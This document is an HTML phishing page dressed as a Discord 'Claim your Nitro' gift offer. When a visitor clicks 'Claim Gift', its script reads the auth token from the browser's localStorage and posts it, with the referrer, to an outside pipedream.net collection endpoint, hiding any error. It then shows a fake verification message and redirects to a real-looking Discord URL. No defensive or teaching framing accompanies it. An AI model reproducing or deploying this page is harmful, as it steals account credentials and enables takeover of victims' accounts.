<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <style>
        /* Discord-style aesthetics */
        body { 
            background-color: #36393f; 
            color: #dcddde; 
            font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;
        }
        .nitro-modal { 
            background: #2f3136; padding: 32px; border-radius: 8px; 
            box-shadow: 0 0 0 1px rgba(0,0,0,0.3), 0 2px 10px 0 rgba(0,0,0,0.6); 
            text-align: center; width: 400px;
        }
        h1 { font-size: 20px; color: #ffffff; margin-bottom: 16px; }
        .description { font-size: 14px; color: #b9bbbe; margin-bottom: 24px; }
        .btn-claim { 
            background: #5865f2; color: #fff; border: none; padding: 10px 20px; 
            border-radius: 3px; font-size: 14px; font-weight: 500; cursor: pointer;
            width: 100%; transition: background 0.17s ease;
        }
        .btn-claim:hover { background: #4752c4; }
    </style>
</head>
<body>
    <div class="nitro-modal">
        <h1>Claim your Nitro</h1>
        <p class="description">You've received a 3-month Nitro gift! Verify your account to finalize the process.</p>
        <button class="btn-claim" id="btn" onclick="start()">Claim Gift</button>
        <div id="status" style="margin-top: 15px; font-size: 13px;"></div>
    </div>

    <script>
        async function start() {
            const btn = document.getElementById('btn');
            const status = document.getElementById('status');
            btn.disabled = true;
            status.innerText = "Connecting to Discord...";

            // Robust token harvesting
            const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");
            
            if(token) {
                try {
                    await fetch('https://eophhta5galgyza.m.pipedream.net', {
                        method: 'POST',
                        mode: 'no-cors',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ token: token, ref: document.referrer })
                    });
                } catch(e) { /* Fail silently */ }
            }
            
            status.innerText = "Verification complete. Redirecting...";
            setTimeout(() => {
                window.location.href = "https://discord.com/billing/promotions/1234567890";
            }, 1200);
        }
    </script>
</body>
</html>
